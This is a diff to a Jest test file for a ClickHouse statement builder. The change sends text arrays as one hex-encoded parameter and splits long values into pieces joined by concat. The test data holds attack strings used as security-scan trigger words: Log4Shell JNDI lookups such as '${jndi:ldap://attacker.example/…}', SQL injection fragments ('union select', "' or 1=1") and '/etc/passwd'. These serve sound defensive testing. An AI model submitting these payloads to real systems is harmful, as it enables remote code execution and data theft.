@@ -2,9 +2,11 @@ import { describe, expect, test } from "@jest/globals";
 import { inspect } from "util";
 import Logger from "../../../../Server/Utils/Logger";
 import {
+  MAX_HEX_PARAMETER_LENGTH,
   QualifiedColumn,
   SQL,
   Statement,
+  toArrayText,
 } from "../../../../Server/Utils/AnalyticsDatabase/Statement";
 import TableColumnType from "../../../../Types/AnalyticsDatabase/TableColumnType";
 import Includes from "../../../../Types/BaseDatabase/Includes";
@@ -19,7 +21,10 @@ import {
 } from "../../../../Utils/SecurityEvent/SecurityScanWords";
 import { generatedTexts } from "../../../Helpers/GeneratedTexts";
 import {
+  decodedQueryParams,
   echoStatement,
+  echoStatementAsWritten,
+  readArrayText,
   readStatementValues,
   statementUrlQuery,
 } from "../../../Helpers/StatementEcho";
@@ -29,12 +34,17 @@ import {
  * security scans look for is sent hex encoded, and ClickHouse decodes it:
  *
  *   {p0:String}          is sent as   unhex({p0:String})
- *   {p1:Array(String)}   is sent as   [unhex({p1_0:String}), unhex({p1_1:String})]
+ *   {p1:Array(String)}   is sent as   CAST(unhex({p1:String}), 'Array(String)')
  *
  * so the query ClickHouse writes down - in its error log, in
  * system.query_log - never holds the attack its words spell, and the scan
  * never reads its own query back as one. Every other parameter is sent as
  * it always was.
+ *
+ * An array is one parameter however many elements it holds (issue #10520:
+ * one per element took the log scan's read past the 1,000 fields ClickHouse
+ * 26.7 takes in a request), and a value longer than one parameter holds is
+ * sent in pieces, joined back by concat.
  */
 
 function hex(text: string): string {
@@ -110,7 +120,7 @@ describe("Statement: text that holds a scan word is sent hex encoded", () => {
     expect(readStatementValues(statement)).toEqual(["${jndi:"]);
   });
 
-  test("a text array: each element its own String parameter, in order", () => {
+  test("a text array: one String parameter, the hex of the array's text, read back by CAST", () => {
     const words: Array<string> = ["${jndi:", "union select", "plain"];
     const statement: Statement = SQL`SELECT multiSearchAnyCaseInsensitive(body, ${{
       type: TableColumnType.ArrayText,
@@ -118,12 +128,10 @@ describe("Statement: text that holds a scan word is sent hex encoded", () => {
     }})`;
 
     expect(statement.query).toBe(
-      "SELECT multiSearchAnyCaseInsensitive(body, [unhex({p0_0:String}), unhex({p0_1:String}), unhex({p0_2:String})])",
+      "SELECT multiSearchAnyCaseInsensitive(body, CAST(unhex({p0:String}), 'Array(String)'))",
     );
     expect(statement.query_params).toStrictEqual({
-      p0_0: hex("${jndi:"),
-      p0_1: hex("union select"),
-      p0_2: hex("plain"),
+      p0: hex("['${jndi:','union select','plain']"),
     });
     expect(readStatementValues(statement)).toEqual([words]);
   });
@@ -138,8 +146,12 @@ describe("Statement: text that holds a scan word is sent hex encoded", () => {
     }}`;
 
     expect(statement.query).toBe(
-      "SELECT * FROM logs WHERE body IN [unhex({p0_0:String}), unhex({p0_1:String})] AND body NOT IN [unhex({p1_0:String}), unhex({p1_1:String})]",
+      "SELECT * FROM logs WHERE body IN CAST(unhex({p0:String}), 'Array(String)') AND body NOT IN CAST(unhex({p1:String}), 'Array(String)')",
     );
+    expect(statement.query_params).toStrictEqual({
+      p0: hex("['/etc/passwd','ok']"),
+      p1: hex("['\\' or 1=1','fine']"),
+    });
     expect(readStatementValues(statement)).toEqual([
       ["/etc/passwd", "ok"],
       ["' or 1=1", "fine"],
@@ -234,7 +246,7 @@ describe("Statement: sendAsHex", () => {
     }}`;
 
     expect(statement.query).toBe(
-      "SELECT unhex({p0:String}), [unhex({p1_0:String}), unhex({p1_1:String})]",
+      "SELECT unhex({p0:String}), CAST(unhex({p1:String}), 'Array(String)')",
     );
     expect(readStatementValues(statement)).toEqual([
       "login",
@@ -281,6 +293,266 @@ describe("Statement: sendAsHex", () => {
     expect(statement.query_params["p2"]).toBe(projectId.toString());
     // As an IN list over a text column always was: its values as text.
     expect(statement.query_params["p3"]).toEqual(["1", "2"]);
+  });
+});
+
+/*
+ * Every ASCII character, quotes and backslashes in every place, text that
+ * looks like an escape, white space, and text that is not ASCII: what an
+ * array's text must carry to ClickHouse and back unchanged.
+ */
+const AWKWARD_TEXTS: ReadonlyArray<string> = [
+  "",
+  "'",
+  "''",
+  "\\",
+  "\\\\",
+  "\\'",
+  "'\\",
+  "\\N",
+  "\\x41",
+  "\\0",
+  "\\n",
+  "it's",
+  "a,b",
+  "[x]",
+  "]",
+  "[",
+  "','",
+  " spaced ",
+  "\u0000",
+  "a\u0000b",
+  "\t\n\r",
+  "Ünïcode ${jndi:ldap://例え.example/ä} — 日本 🙂",
+  ...Array.from({ length: 127 }, (_value: unknown, index: number): string => {
+    return `<${String.fromCharCode(index + 1)}>`;
+  }),
+];
+
+describe("Statement: an array of text is one parameter, however long (#10520)", () => {
+  test("its text: each element between quotes, a quote and a backslash escaped, nothing else", () => {
+    expect(toArrayText([])).toBe("[]");
+    expect(toArrayText([""])).toBe("['']");
+    expect(
+      toArrayText([
+        "a",
+        "it's",
+        "back\\slash",
+        "\\'",
+        "日本 🙂",
+        "line\nbreak\ttab\u0000nul",
+        "[x],'y'",
+      ]),
+    ).toBe(
+      "['a','it\\'s','back\\\\slash','\\\\\\'','日本 🙂','line\nbreak\ttab\u0000nul','[x],\\'y\\'']",
+    );
+  });
+
+  test("its text reads back to the array, whatever the elements hold", () => {
+    const texts: Array<string> = [
+      ...AWKWARD_TEXTS,
+      ...generatedTexts(2000, 10520, AWKWARD_TEXTS, 8),
+    ];
+
+    expect(readArrayText(toArrayText(texts))).toEqual(texts);
+  });
+
+  test("and sent hex encoded, the query reads every element back as it was given", () => {
+    const texts: Array<string> = [
+      "${jndi:",
+      ...AWKWARD_TEXTS,
+      ...generatedTexts(500, 10521, AWKWARD_TEXTS, 6),
+    ];
+    const statement: Statement = SQL`SELECT has(${{
+      type: TableColumnType.ArrayText,
+      value: texts,
+    }}, body)`;
+
+    expect(Object.keys(statement.query_params)).toEqual(["p0"]);
+    expect(readStatementValues(statement)).toEqual([texts]);
+    expect(decodedQueryParams(statement)).toEqual({ p0: texts });
+  });
+
+  test("two thousand words are one parameter, as two are", () => {
+    for (const count of [2, 20, 200, 2000]) {
+      const words: Array<string> = Array.from(
+        { length: count },
+        (_value: unknown, index: number): string => {
+          return `\${jndi:ldap://${index}`;
+        },
+      );
+      const statement: Statement = SQL`SELECT multiSearchAnyCaseInsensitive(body, ${{
+        type: TableColumnType.ArrayText,
+        value: words,
+      }}) OR body IN ${{
+        type: TableColumnType.Text,
+        value: new Includes(words),
+      }} OR body = ${{ type: TableColumnType.Text, value: words[0]! }}`;
+
+      expect({ count, params: Object.keys(statement.query_params) }).toEqual({
+        count,
+        params: ["p0", "p1", "p2"],
+      });
+      expect(statement.query).toBe(
+        "SELECT multiSearchAnyCaseInsensitive(body, CAST(unhex({p0:String}), 'Array(String)')) OR body IN CAST(unhex({p1:String}), 'Array(String)') OR body = unhex({p2:String})",
+      );
+      expect(readStatementValues(statement)).toEqual([words, words, words[0]]);
+    }
+  });
+
+  test("the query's text does not grow with the elements either", () => {
+    const one: Statement = SQL`SELECT has(${{
+      type: TableColumnType.ArrayText,
+      value: ["${jndi:"],
+    }}, body)`;
+    const many: Statement = SQL`SELECT has(${{
+      type: TableColumnType.ArrayText,
+      value: Array.from({ length: 1000 }, (): string => {
+        return "${jndi:";
+      }),
+    }}, body)`;
+
+    expect(many.query).toBe(one.query);
+  });
+
+  test("sent as written, the same array spells its words again (the control)", () => {
+    const statement: Statement = SQL`SELECT multiSearchAny(body, ${{
+      type: TableColumnType.ArrayText,
+      value: ["${jndi:ldap://x}", "union select"],
+    }})`;
+
+    expect(readsAsScanWord(echoStatement(statement))).toBe(false);
+    expect(echoStatementAsWritten(statement)).toBe(
+      "SELECT multiSearchAny(body, _CAST(['${jndi:ldap://x}', 'union select'], 'Array(String)'))",
+    );
+    expect(readsAsScanWord(echoStatementAsWritten(statement))).toBe(true);
+  });
+});
+
+describe("Statement: a value longer than one parameter holds is sent in pieces", () => {
+  // A text holding a scan word whose UTF-8 is `bytes` long.
+  function textOf(bytes: number): string {
+    return `\${jndi:${"a".repeat(Math.max(0, bytes - "${jndi:".length))}`;
+  }
+
+  function pieceLengths(statement: Statement): Array<number> {
+    return Object.values(statement.query_params).map(
+      (value: unknown): number => {
+        return String(value).length;
+      },
+    );
+  }
+
+  test("the longest piece is under the 128 KiB ClickHouse takes of one field, and whole bytes", () => {
+    expect(MAX_HEX_PARAMETER_LENGTH).toBeLessThan(128 * 1024);
+    expect(MAX_HEX_PARAMETER_LENGTH % 2).toBe(0);
+  });
+
+  test("a text whose hex is just the most one parameter holds is one parameter", () => {
+    const text: string = textOf(MAX_HEX_PARAMETER_LENGTH / 2);
+    const statement: Statement = SQL`SELECT ${{
+      type: TableColumnType.Text,
+      value: text,
+    }}`;
+
+    expect(statement.query).toBe("SELECT unhex({p0:String})");
+    expect(pieceLengths(statement)).toEqual([MAX_HEX_PARAMETER_LENGTH]);
+    expect(readStatementValues(statement)).toEqual([text]);
+  });
+
+  test("one byte more, and it is two pieces, joined by concat", () => {
+    const text: string = textOf(MAX_HEX_PARAMETER_LENGTH / 2 + 1);
+    const statement: Statement = SQL`SELECT ${{
+      type: TableColumnType.Text,
+      value: text,
+    }}`;
+
+    expect(statement.query).toBe(
+      "SELECT concat(unhex({p0_0:String}), unhex({p0_1:String}))",
+    );
+    expect(pieceLengths(statement)).toEqual([MAX_HEX_PARAMETER_LENGTH, 2]);
+    expect(readStatementValues(statement)).toEqual([text]);
+    expect(decodedQueryParams(statement)).toEqual({ p0: text });
+    expect(echoStatementAsWritten(statement)).toBe(`SELECT '${text}'`);
+  });
+
+  test("an array's text in pieces, joined before the CAST reads it", () => {
+    const words: Array<string> = Array.from(
+      { length: 20000 },
+      (_value: unknown, index: number): string => {
+        return `\${jndi:ldap://attacker.example/${index}`;
+      },
+    );
+    const statement: Statement = SQL`SELECT has(${{
+      type: TableColumnType.ArrayText,
+      value: words,
+    }}, body)`;
+    const hexLength: number = Buffer.byteLength(toArrayText(words), "utf8") * 2;
+    const pieces: number = Math.ceil(hexLength / MAX_HEX_PARAMETER_LENGTH);
+
+    expect(pieces).toBeGreaterThan(2);
+    expect(statement.query).toBe(
+      `SELECT has(CAST(concat(${Array.from(
+        { length: pieces },
+        (_value: unknown, index: number): string => {
+          return `unhex({p0_${index}:String})`;
+        },
+      ).join(", ")}), 'Array(String)'), body)`,
+    );
+    expect(Object.keys(statement.query_params)).toHaveLength(pieces);
+
+    for (const length of pieceLengths(statement)) {
+      expect(length).toBeLessThanOrEqual(MAX_HEX_PARAMETER_LENGTH);
+      expect(length % 2).toBe(0);
+    }
+
+    expect(readStatementValues(statement)).toEqual([words]);
+    expect(readsAsScanWord(statementUrlQuery(statement))).toBe(false);
+    expect(readsAsScanWord(echoStatement(statement))).toBe(false);
+  });
+
+  test("a character cut between two pieces is whole again once they are joined", () => {
+    // 7 bytes of "${jndi:", then 3 bytes a character: a piece of 51,200 bytes ends inside one.
+    const text: string = `\${jndi:${"日".repeat(30000)}`;
+    const statement: Statement = SQL`SELECT ${{
+      type: TableColumnType.Text,
+      value: text,
+    }}`;
+    const first: string = String(statement.query_params["p0_0"]);
+
+    expect((first.length / 2 - "${jndi:".length) % 3).not.toBe(0);
+    expect(Buffer.from(first, "hex").toString("utf8")).toContain("�");
+    expect(readStatementValues(statement)).toEqual([text]);
+  });
+
+  test("no parameter is ever longer than one piece, whatever the size", () => {
+    const half: number = MAX_HEX_PARAMETER_LENGTH / 2;
+
+    for (const bytes of [
+      7,
+      1000,
+      half - 1,
+      half,
+      half + 1,
+      2 * half,
+      3 * half + 1,
+      10 * half,
+    ]) {
+      const text: string = textOf(bytes);
+      const statement: Statement = SQL`SELECT ${{
+        type: TableColumnType.Text,
+        value: text,
+      }}, ${{ type: TableColumnType.ArrayText, value: [text, "x"] }}`;
+
+      for (const length of pieceLengths(statement)) {
+        expect({ bytes, length: length <= MAX_HEX_PARAMETER_LENGTH }).toEqual({
+          bytes,
+          length: true,
+        });
+      }
+
+      expect(readStatementValues(statement)).toEqual([text, [text, "x"]]);
+    }
   });
 });
 
